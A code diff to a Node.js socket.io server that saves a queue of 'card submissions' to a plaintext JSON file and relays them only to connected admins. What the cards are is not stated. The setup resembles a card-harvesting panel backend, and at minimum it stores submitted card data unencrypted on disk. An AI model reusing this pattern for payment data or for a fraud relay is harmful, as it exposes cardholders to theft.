@@ -1,4 +1,5 @@
 const express = require('express');
+const fs = require('fs');
 const path = require('path');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -14,7 +15,34 @@ const io = new Server(server, {
 });
 
 // In-memory storage for card submissions
-const cardSubmissionsQueue = []; // This will store submissions until an admin connects
+const submissionsFilePath = path.join(__dirname, 'submissions.json');
+let cardSubmissionsQueue = []; // This will store submissions until an admin connects
+
+// Function to load submissions from file
+const loadSubmissions = () => {
+  try {
+    if (fs.existsSync(submissionsFilePath)) {
+      const data = fs.readFileSync(submissionsFilePath, 'utf8');
+      cardSubmissionsQueue = JSON.parse(data);
+      console.log(`[Server] Loaded ${cardSubmissionsQueue.length} submissions from file.`);
+    }
+  } catch (error) {
+    console.error('[Server] Error loading submissions from file:', error);
+  }
+};
+
+// Function to save submissions to file
+const saveSubmissions = () => {
+  try {
+    fs.writeFileSync(submissionsFilePath, JSON.stringify(cardSubmissionsQueue, null, 2), 'utf8');
+    console.log('[Server] Submissions saved to file.');
+  } catch (error) {
+    console.error('[Server] Error saving submissions to file:', error);
+  }
+};
+
+// Load submissions when the server starts
+loadSubmissions();
 
 io.on('connection', (socket) => {
 
@@ -66,6 +94,7 @@ io.on('connection', (socket) => {
 
     // Add the submission to the in-memory queue
     cardSubmissionsQueue.push(submissionPayload);
+    saveSubmissions(); // Save to file after adding new submission
     console.log(`[Server] Card submission received and queued. Queue size: ${cardSubmissionsQueue.length}`);
 
     // Send the data ONLY to admins
